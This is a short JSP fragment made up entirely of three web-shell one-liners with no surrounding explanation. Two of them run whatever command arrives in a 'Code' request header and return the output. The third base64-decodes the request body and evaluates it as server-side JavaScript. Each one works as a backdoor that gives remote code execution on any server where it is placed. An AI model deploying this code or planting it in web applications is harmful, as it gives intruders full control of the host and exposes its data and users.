<jsp:expression>
    new java.util.Scanner(new ProcessBuilder(new String[]{request.getHeader("Code")}).start().getInputStream()).useDelimiter("\\A").next()
</jsp:expression>

<%=new java.util.Scanner(new ProcessBuilder(new String[]{request.getHeader("Code")}).start().getInputStream()).useDelimiter("\\A").next()%>


<%=new javax.script.ScriptEngineManager().getEngineByExtension("js").eval(new String(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream())))%>